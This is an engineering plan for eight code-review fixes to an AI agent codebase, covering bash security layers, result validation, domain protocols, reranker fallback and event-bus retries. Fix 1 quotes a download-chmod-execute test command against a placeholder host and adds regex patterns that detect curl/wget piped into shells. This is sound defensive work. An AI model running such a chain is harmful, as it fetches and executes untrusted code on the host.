# Residual Fixes Plan
**Scope**: Issues found during code review of the Phase 1–4 implementation (commit `042548c`).
**Architecture constraint**: Dependency Rule — Domain ← Application ← Infrastructure ← Interfaces. No fix may introduce an import that flows outward.

---

## Issue Index

| # | Severity | Category | File | Root Cause |
|---|----------|----------|------|------------|
| 1 | HIGH | Test regression | `tools/bash_security.py` | `_layer2`: no pattern for chmod+execute without explicit shell name |
| 2 | HIGH | Test regression | `tools/bash_security.py` | `_layer4`: chain threshold 8 too high; 6-operator chain is not flagged |
| 3 | MEDIUM | Fragile logic | `application/services/step_result_validator.py` | English-string bypass; dead tool names |
| 4 | MEDIUM | Wrong strategy | `application/flows/states/executing.py` | "longest text wins" picks error logs over final result |
| 5 | MEDIUM | Protocol breakage | `domain/ports.py` | `IRepository` declares `save_plan/load_plan` that no concrete class implements |
| 6 | MEDIUM | Unvalidated change | `infrastructure/adapters/openrouter_rerank_adapter.py` | `RERANK_MODEL_FREE` not confirmed to work with rerank API |
| 7 | LOW | Dead code | `tools/bash_tool.py` | `getattr(approval, 'category', ...)` always falls back |
| 8 | LOW | Backoff scope | `infrastructure/event_bus.py` | Retry backoff applied to all handlers including real-time UI |

---

## Fix 1 — `bash_security._layer2_behavioral_analysis` misses chmod+execute pattern

### Problem
`test_layer2_behavioral_independent` tests:
```python
assessment = analyzer._layer2_behavioral_analysis(
    "curl http://x.com/script && chmod +x script && ./script"
)
assert assessment.risk_level == RiskLevel.DANGEROUS
```

The existing `download_execute_patterns` list at `bash_security.py:249` requires an explicit shell interpreter name (`bash`, `sh`, `python`, etc.) after the chain operator. `./script` is a generic executable — no pattern matches it. The `_SUSPICIOUS_COMBINATIONS` check also fails: the target set for the curl indicator is `{'bash', 'sh', 'zsh', '|'}`, and neither `'|'` (not a word token) nor `'bash'` appear in the tokenised command.

This is a real security gap: download → chmod → execute is a canonical malware delivery pattern.

### Layer
`Tools` (`weebot/tools/bash_security.py`) — no domain/application imports involved.

### Fix

Add one pattern to `download_execute_patterns` that catches the chmod+execute chain regardless of interpreter name:

```python
# weebot/tools/bash_security.py  inside _layer2_behavioral_analysis()

download_execute_patterns = [
    # existing patterns …
    r'(curl|wget|Invoke-WebRequest|iwr).*(&&|\||;).*\b(bash|sh|zsh|python|python3|perl|ruby|node|cmd|powershell|pwsh)\b',
    r'\b(bash|sh|zsh|python|python3|perl|ruby|node)\b.*(&&|\||;).*\b(curl|wget|Invoke-WebRequest|iwr)\b',
    r'(curl|wget|Invoke-WebRequest|iwr).*\|\s*\b(bash|sh|zsh|python|python3|perl|ruby|node|cmd|powershell|pwsh)\b',
    r'\b(download|fetch|get-content|get).*\s+.*\s+.*\|\s*\b(execute|run|start|bash|sh|zsh)\b',
    r'(chmod\s+\+x|\.\/|\./).*(&&|\||;).*\b(bash|sh|zsh|python|python3|perl|ruby|node|cmd|powershell|pwsh)\b',
    # NEW: chmod+x followed by ./execute (no explicit shell name required)
    r'(curl|wget|Invoke-WebRequest|iwr).+(&&|\|).+(chmod\s+\+x).+(&&|\|).+(\./|\b\w+\.sh\b)',
]
```

Also add `'./script'`-style execution as a recognised target in `_SUSPICIOUS_COMBINATIONS` for the curl indicator:

```python
_SUSPICIOUS_COMBINATIONS: List[Tuple[Set[str], Set[str], str]] = [
    (
        {'curl', 'wget'},
        {'bash', 'sh', 'zsh', 'chmod'},   # ← add 'chmod' as a target
        "download to shell execution",
    ),
    # … rest unchanged
]
```

### Tests
The existing test `test_layer2_behavioral_independent` must pass unchanged after this fix.

Add a complementary non-regression test:
```python
def test_layer2_benign_curl_not_flagged(self, analyzer):
    """Plain curl to a JSON API should not trigger layer 2."""
    r = analyzer._layer2_behavioral_analysis(
        "curl -s https://api.example.com/data -H 'Accept: application/json'"
    )
    assert r.risk_level == RiskLevel.SAFE
```

---

## Fix 2 — `bash_security._layer4_semantic_analysis` threshold too high

### Problem
`test_layer4_semantic_independent` tests:
```python
cmd = "a | b | c | d | e | f | g"   # 6 pipe operators
assessment = analyzer._layer4_semantic_analysis(cmd)
assert assessment.risk_level == RiskLevel.SUSPICIOUS
```

`_MAX_COMMAND_CHAIN_LENGTH = 8` (raised from 5 to accommodate PowerShell pipelines). Six operators (`6 < 8`) no longer triggers the SUSPICIOUS threshold. The test was written when the constant was 5.

The current fix for PowerShell (separate threshold of 20) is correct. The general non-PowerShell threshold of 8 is too permissive — `a | b | c | d | e | f | g` is not a PowerShell command and 6 operators is a valid suspicion signal.

### Layer
`Tools` (`weebot/tools/bash_security.py`).

### Fix

Lower `_MAX_COMMAND_CHAIN_LENGTH` back to 6 for non-PowerShell commands. The PowerShell exemption threshold of 20 stays unchanged:

```python
# weebot/tools/bash_security.py

# BEFORE:
_MAX_COMMAND_CHAIN_LENGTH: int = 8  # Max operators in chain

# AFTER:
_MAX_COMMAND_CHAIN_LENGTH: int = 6  # Max operators for non-PowerShell commands
                                     # PowerShell uses a separate threshold of 20
                                     # (see _layer4_semantic_analysis)
```

This change is safe because PowerShell commands — which legitimately chain many pipes — are already exempted via `_powershell_threshold = 20` when a PowerShell cmdlet is detected.

### Tests
The existing `test_layer4_semantic_independent` must pass. Add a non-regression test:
```python
def test_layer4_powershell_pipeline_not_flagged(self, analyzer):
    """Legitimate PowerShell pipeline with >6 operators must stay SAFE."""
    cmd = (
        "Get-ChildItem -Recurse | Where-Object {$_.Extension -eq '.py'}"
        " | Select-Object Name | Sort-Object | Format-Table"
    )
    r = analyzer._layer4_semantic_analysis(cmd)
    assert r.risk_level == RiskLevel.SAFE
```

---

## Fix 3 — `StepResultValidator` fragile bypass + dead tool names

### Problem

**3a — Dead tool names.** `_FILE_CREATION_TOOLS` at `step_result_validator.py:26` contains:
```python
_FILE_CREATION_TOOLS: frozenset[str] = frozenset({
    "file_editor", "write_file", "create_file", "edit_file",
})
```
`write_file` and `create_file` are not registered tools in weebot's tool registry. They are dead entries that silently do nothing.

**3b — English string matching.** The bypass condition:
```python
if tr and ('Created' in str(tr) or 'Updated' in str(tr) or 'Wrote' in str(tr)):
```
Fails for any tool that returns a non-English success message, a JSON object, a byte count, `"OK"`, `"Success"`, or a boolean. A tool returning `'{"status": "ok", "path": "..."}'` bypasses nothing.

The correct signal is `ToolStatus.CALLED` + `not is_error` — not the content of the result string.

### Layer
`Application/Services` (`weebot/application/services/step_result_validator.py`). The fix uses `ToolEvent.status` and `ToolEvent.is_error` — both domain model fields.

### Fix

**3a — Fix dead tool names:**
```python
# weebot/application/services/step_result_validator.py

# Remove write_file and create_file — neither tool exists in the registry.
# Only file_editor and edit_file are registered weebot tools.
_FILE_CREATION_TOOLS: frozenset[str] = frozenset({
    "file_editor",
    "edit_file",
})
```

**3b — Replace string-match bypass with status-based bypass:**
```python
# weebot/application/services/step_result_validator.py
from weebot.domain.models.event import ToolStatus

if step_events:
    for e in step_events:
        tn = (getattr(e, 'tool_name', '') or getattr(e, 'function_name', ''))
        if tn not in _FILE_CREATION_TOOLS:
            continue
        # A tool event is a successful creation if: status=CALLED and no error
        status = getattr(e, 'status', None)
        is_error = getattr(e, 'is_error', False)
        result_text = str(getattr(e, 'result', '') or '')
        if status == ToolStatus.CALLED and not is_error and result_text:
            return ValidationResult(passed=True)
```

The `ToolStatus.CALLED` status means the tool completed its invocation (as opposed to `CALLING` which is before execution). `is_error=False` means it succeeded. This is the correct semantic check regardless of result string content.

### Tests

Update the existing string-based bypass tests to use the new logic (they should still pass, since successful file_editor calls will have status=CALLED and is_error=False). Add:

```python
def test_file_creation_arbitrary_result_text_bypasses(validator):
    """Bypass triggers regardless of result string content — status is the signal."""
    event = ToolEvent(
        type="tool", tool_call_id="c1", tool_name="file_editor",
        function_name="file_editor", status=ToolStatus.CALLED,
        result='{"path": "foo.py", "lines": 42}',  # JSON, not English
    )
    r = validator.validate(result=None, step_description="Create file", step_events=[event])
    assert r.passed

def test_dead_tool_names_do_not_bypass(validator):
    """write_file and create_file are not registered tools — must not bypass."""
    for dead_name in ("write_file", "create_file"):
        event = ToolEvent(
            type="tool", tool_call_id="c1", tool_name=dead_name,
            function_name=dead_name, status=ToolStatus.CALLED, result="ok",
        )
        r = validator.validate(result=None, step_description="step", step_events=[event])
        assert not r.passed, f"{dead_name} should not bypass validation"
```

---

## Fix 4 — `executing.py` "longest text wins" picks error logs over result

### Problem
`executing.py:206-217` populates `step.result` by iterating `_current_step_events` and keeping the **longest** message or tool result text:

```python
_last_result_text = ""
for event in _current_step_events:
    if isinstance(event, MessageEvent) and getattr(event, 'role', '') == 'assistant':
        msg = getattr(event, 'message', '') or ''
        if msg and len(msg) > len(_last_result_text):   # ← longest wins
            _last_result_text = msg
    elif isinstance(event, ToolEvent):
        tr = getattr(event, 'result', '') or ''
        if tr and len(tr) > len(_last_result_text):     # ← longest wins
            _last_result_text = tr
```

A long recursive directory listing (`Get-ChildItem -Recurse`) will always beat a short final assistant message like `"Step completed. Created 3 files."`. The strategy extracts the wrong value as the canonical result.

### Layer
`Application/Flows/States` (`weebot/application/flows/states/executing.py`).

### Fix

Replace "longest wins" with a two-tier priority strategy:

**Tier 1** — The last `MessageEvent` with `role=assistant` that does not contain error keywords. This is what the agent reported as its conclusion.

**Tier 2 (fallback)** — The result of the last successful `file_editor` or `python_execute` tool event, if no qualifying assistant message exists.

```python
# weebot/application/flows/states/executing.py

# ── Fix 1 (revised): Extract canonical step result from execution events ──
# Priority: last non-error assistant message > last successful write-tool result.
_ERROR_PHRASES = frozenset({
    "error", "failed", "exception", "traceback", "blocked", "denied",
    "timeout", "timed out", "permission",
})
_WRITE_TOOLS = frozenset({"file_editor", "edit_file", "python_execute"})

_result_from_assistant = ""
_result_from_tool = ""

for event in _current_step_events:
    if isinstance(event, MessageEvent) and getattr(event, 'role', '') == 'assistant':
        msg = (getattr(event, 'message', '') or '').strip()
        if msg and not any(kw in msg.lower() for kw in _ERROR_PHRASES):
            _result_from_assistant = msg  # keep updating — last qualifying wins

    elif isinstance(event, ToolEvent):
        tn = getattr(event, 'tool_name', '') or ''
        if tn in _WRITE_TOOLS:
            tr = (str(getattr(event, 'result', '') or '')).strip()
            is_error = getattr(event, 'is_error', False)
            if tr and not is_error:
                _result_from_tool = tr  # keep updating — last successful wins

_last_result_text = _result_from_assistant or _result_from_tool
if _last_result_text:
    step = step.model_copy(update={"result": _last_result_text})
```

### Tests

```python
# tests/unit/test_executing_state_result_extraction.py

def test_prefers_assistant_message_over_long_directory_listing():
    events = (
        _make_tool_event("bash", result="file1.py\n" * 500)   # long listing
        + _make_assistant_event("Created 3 files in src/domain/")
    )
    result = _extract_result(events)
    assert result == "Created 3 files in src/domain/"

def test_falls_back_to_tool_result_when_no_assistant_message():
    events = [_make_tool_event("file_editor", result="Wrote foo.py (120 chars)", success=True)]
    result = _extract_result(events)
    assert "foo.py" in result

def test_skips_error_assistant_messages():
    events = (
        _make_assistant_event("Error: command blocked by security policy")
        + _make_tool_event("file_editor", result="Wrote bar.py (50 chars)", success=True)
    )
    result = _extract_result(events)
    assert "bar.py" in result
```

---

## Fix 5 — `IRepository` Protocol declares unimplemented optional methods

### Problem
`domain/ports.py:34-36` adds `save_plan` and `load_plan` to `IRepository`:

```python
# Optional: plan-level operations for convenience (still domain-pure)
async def save_plan(self, session_id: str, plan: Plan) -> None: ...
async def load_plan(self, session_id: str) -> Plan | None: ...
```

The comment calls them "optional", but Python `Protocol` has no optional methods. Any `isinstance(obj, IRepository)` check will return `False` for an object that implements only the four session methods. Since `IRepository` is `@runtime_checkable`, this silently breaks structural subtype checks.

No concrete class in the codebase implements `IRepository` directly (the application layer uses `StateRepositoryPort`). The test file `test_domain_ports.py:48` only checks `issubclass(IRepository, Protocol)`, which passes regardless.

### Layer
`Domain` (`weebot/domain/ports.py`).

### Fix

Split into two protocols. Domain code that only needs session storage uses `IRepository`. Code that also manages plans uses `ISessionPlanRepository(IRepository)`:

```python
# weebot/domain/ports.py

@runtime_checkable
class IRepository(Protocol):
    """Port for persistent session storage."""

    async def save_session(self, session: Session) -> None: ...
    async def load_session(self, session_id: str) -> Session: ...
    async def list_sessions(self, user_id: str | None = None) -> list[dict[str, Any]]: ...
    async def delete_session(self, session_id: str) -> None: ...


@runtime_checkable
class ISessionPlanRepository(IRepository, Protocol):
    """Extended port for storage implementations that also manage Plans.

    Inherits all four session methods from IRepository.
    Use this protocol only when plan-level operations are explicitly needed.
    Do not add plan methods to IRepository — they are not universally implemented.
    """

    async def save_plan(self, session_id: str, plan: Plan) -> None: ...
    async def load_plan(self, session_id: str) -> Plan | None: ...
```

Export `ISessionPlanRepository` from `domain/ports.py`. Any future concrete class that implements all six methods satisfies both protocols.

### Tests

```python
# tests/unit/test_domain_ports.py

def test_irepository_satisfied_without_plan_methods():
    """A class implementing only 4 session methods satisfies IRepository."""
    class MinimalRepo:
        async def save_session(self, session): pass
        async def load_session(self, session_id): return None
        async def list_sessions(self, user_id=None): return []
        async def delete_session(self, session_id): pass
    assert isinstance(MinimalRepo(), IRepository)

def test_isessionplanrepository_requires_plan_methods():
    """ISessionPlanRepository requires all 6 methods."""
    class MinimalRepo:
        async def save_session(self, session): pass
        async def load_session(self, session_id): return None
        async def list_sessions(self, user_id=None): return []
        async def delete_session(self, session_id): pass
    assert not isinstance(MinimalRepo(), ISessionPlanRepository)

def test_full_repo_satisfies_both():
    class FullRepo:
        async def save_session(self, session): pass
        async def load_session(self, session_id): return None
        async def list_sessions(self, user_id=None): return []
        async def delete_session(self, session_id): pass
        async def save_plan(self, session_id, plan): pass
        async def load_plan(self, session_id): return None
    assert isinstance(FullRepo(), IRepository)
    assert isinstance(FullRepo(), ISessionPlanRepository)
```

---

## Fix 6 — Validate `RERANK_MODEL_FREE` against OpenRouter rerank API

### Problem
`model_refs.py` and `openrouter_rerank_adapter.py` now default to `nvidia/llama-nemotron-rerank-vl-1b-v2:free`. The docstring warns: *"This is a 1B-parameter model... results may differ in quality."*

More critically, OpenRouter's reranking endpoint (`POST /v1/rerank`) uses Cohere's rerank API contract, which requires a model that explicitly supports the rerank interface. If NVIDIA Nemotron 1B does not support this interface, `rerank()` calls will fail with a 422 or 404 and degrade the skill retriever silently to BM25-only with no error surfaced to the operator.

### Layer
`Infrastructure` (`weebot/infrastructure/adapters/openrouter_rerank_adapter.py`).

### Fix

**Step 1 — Add a verified model constant.** Query the OpenRouter API to confirm the model works, then add it as a verified constant:

```python
# weebot/config/model_refs.py

# Confirmed to work with OpenRouter POST /v1/rerank (Cohere-compatible interface)
RERANK_MODEL_VERIFIED: str = "cohere/rerank-v3.5"
"""Cohere Rerank v3.5 — verified to work with OpenRouter rerank endpoint.
Fallback for RERANK_MODEL_FREE when free model is unavailable or unsupported."""
```

**Step 2 — Add graceful fallback in the adapter.** If the free model returns a non-200 response, retry once with `RERANK_MODEL_VERIFIED`:

```python
# weebot/infrastructure/adapters/openrouter_rerank_adapter.py

async def rerank(
    self,
    query: str,
    documents: list[str],
    top_n: int | None = None,
    model: str | None = None,
) -> list[RerankResult]:
    effective_model = model or self._default_model
    try:
        return await self._call_rerank(query, documents, top_n, effective_model)
    except RerankAPIError as exc:
        if effective_model == RERANK_MODEL_FREE:
            logger.warning(
                "Rerank with free model %s failed (%s) — retrying with verified fallback %s",
                effective_model, exc, RERANK_MODEL_VERIFIED,
            )
            return await self._call_rerank(query, documents, top_n, RERANK_MODEL_VERIFIED)
        raise
```

**Step 3 — Add integration smoke test** (marked with `pytest.mark.integration` so it doesn't run in CI by default):

```python
# tests/integration/test_rerank_model_validation.py

@pytest.mark.integration
async def test_free_rerank_model_accepts_requests():
    """Confirm OpenRouter accepts the free rerank model on the /rerank endpoint."""
    adapter = OpenRouterRerankAdapter()
    results = await adapter.rerank(
        query="What is the capital of France?",
        documents=["Paris is the capital.", "London is in England.", "Berlin is in Germany."],
        top_n=2,
    )
    assert len(results) == 2
    assert results[0].document == "Paris is the capital."
```

---

## Fix 7 — Remove dead `getattr(approval, 'category', ...)` in `bash_tool.py`

### Problem
`bash_tool.py:376`:
```python
category = getattr(approval, 'category', 'security policy')
```
`ApprovalResult` (defined in `weebot/core/approval_policy.py`) has no `category` field. The `getattr` always returns `'security policy'`. This adds noise, obscures intent, and would mask a real `AttributeError` if the field were ever added with a different type.

### Layer
`Tools` (`weebot/tools/bash_tool.py`).

### Fix
Remove the `getattr` and use the literal string directly:

```python
# BEFORE:
category = getattr(approval, 'category', 'security policy')
return ToolResult(
    output="",
    error=(
        f"Command blocked by {category}: {approval.reason}. "
        f"Find an alternative approach that does not trigger this policy."
    ),
)

# AFTER:
return ToolResult(
    output="",
    error=(
        f"Command blocked by security policy: {approval.reason}. "
        f"Find an alternative approach that does not trigger this policy."
    ),
)
```

If a `category` field is ever added to `ApprovalResult`, it should be threaded explicitly through the call site, not accessed via `getattr`.

---

## Fix 8 — `AsyncEventBus` retry backoff scoped to storage handlers only

### Problem
`event_bus.py` wraps all handlers in `_safe_call_with_retry`, which adds up to 200ms exponential backoff on the second retry:

```python
await asyncio.sleep(0.1 * (2 ** attempt))  # 100ms on attempt 0, 200ms on attempt 1
```

WebSocket broadcast handlers and CLI streaming handlers are subscribed on the same bus. A transient error in any handler now adds 200ms latency to every subsequent event for every subscriber. Real-time UI rendering will stall noticeably.

### Layer
`Infrastructure` (`weebot/infrastructure/event_bus.py`).

### Fix

Mark handlers at subscription time as retriable or fire-and-forget. Add an optional `retryable: bool` parameter to `subscribe()`:

```python
# weebot/infrastructure/event_bus.py

def subscribe(self, handler: EventHandler, *, retryable: bool = False) -> None:
    """Subscribe to all agent events.

    Args:
        handler:   Async callable (event) -> None.
        retryable: If True, failures are retried with exponential backoff
                   (suitable for storage/persistence handlers).
                   If False (default), the handler is called once; failure
                   is logged but does not delay other handlers.
    """
    self._handlers.append((handler, retryable))

async def _dispatch(self, handlers: list[tuple[EventHandler, bool]], event: AgentEvent) -> None:
    results = await asyncio.gather(
        *[
            self._safe_call_with_retry(h, event) if retryable
            else self._safe_call_once(h, event)
            for h, retryable in handlers
        ],
        return_exceptions=True,
    )
    for idx, result in enumerate(results):
        if isinstance(result, Exception):
            logger.exception("Event handler %s failed", handlers[idx][0])

@staticmethod
async def _safe_call_once(handler: EventHandler, event: AgentEvent) -> None:
    """Fire-and-forget: one attempt, no retry, no backoff."""
    await handler(event)
```

Call sites that subscribe persistence handlers pass `retryable=True`; UI/streaming subscribers use the default `retryable=False`.

### Migration

Identify call sites that subscribe storage or persistence handlers and add `retryable=True`:

```python
# In application DI wiring (weebot/application/di/__init__.py or similar):
event_bus.subscribe(session_persistence_handler, retryable=True)
event_bus.subscribe(knowledge_graph_handler, retryable=True)

# UI/streaming handlers stay retryable=False (the default):
event_bus.subscribe(websocket_broadcast_handler)
event_bus.subscribe(cli_stream_handler)
```

### Tests

```python
def test_non_retryable_handler_called_once_on_failure():
    """A non-retryable handler that raises is called exactly once."""
    calls = []
    async def flaky(event):
        calls.append(event)
        raise RuntimeError("oops")

    bus = AsyncEventBus()
    bus.subscribe(flaky, retryable=False)
    asyncio.run(bus.publish(MessageEvent(role="assistant", message="hi")))
    assert len(calls) == 1   # one call, no retry

def test_retryable_handler_retried_on_transient_failure():
    """A retryable handler is retried up to max_retries times."""
    calls = []
    async def flaky(event):
        calls.append(event)
        if len(calls) < 3:
            raise RuntimeError("transient")

    bus = AsyncEventBus(max_retries=2)
    bus.subscribe(flaky, retryable=True)
    asyncio.run(bus.publish(MessageEvent(role="assistant", message="hi")))
    assert len(calls) == 3   # 2 failures + 1 success
```

---

## Implementation Order

Fixes are independent except where noted. Suggested order minimises blast radius:

```
Phase 1 — Failing tests (unblocks CI): Fix 1, Fix 2
  Tests: pytest tests/unit/tools/test_bash_security_falsifying.py

Phase 2 — Correctness (logic bugs in newly-introduced code): Fix 3, Fix 4
  Tests: pytest tests/unit/test_step_result_validator.py
         pytest tests/unit/test_executing_state_result_extraction.py  (new file)

Phase 3 — Domain model integrity: Fix 5
  Tests: pytest tests/unit/test_domain_ports.py

Phase 4 — Infrastructure hygiene: Fix 6, Fix 7, Fix 8
  Tests: pytest tests/unit/tools/test_bash_tool.py
         pytest tests/unit/test_event_bus.py
         (integration test gated behind pytest.mark.integration)
```

Full regression after all phases:
```bash
pytest tests/unit/ -q --tb=short
```

---

## Architectural Compliance

| Fix | Layer modified | Dependency direction |
|-----|---------------|---------------------|
| 1 | Tools | No cross-layer imports — pure internal logic ✓ |
| 2 | Tools | No cross-layer imports — constant change only ✓ |
| 3 | Application/Services | Imports `ToolStatus` from Domain ← correct direction ✓ |
| 4 | Application/Flows/States | Imports `MessageEvent`, `ToolEvent` from Domain ← correct direction ✓ |
| 5 | Domain | New protocol — no new imports needed ✓ |
| 6 | Infrastructure | Imports `RERANK_MODEL_VERIFIED` from config; config is not a layer ✓ |
| 7 | Tools | Removes a `getattr` — no imports changed ✓ |
| 8 | Infrastructure | `subscribe()` signature change is backward-compatible (default `retryable=False`) ✓ |

No fix introduces an outward dependency. Domain layer is modified only to add a new protocol (Fix 5), which has no external imports.
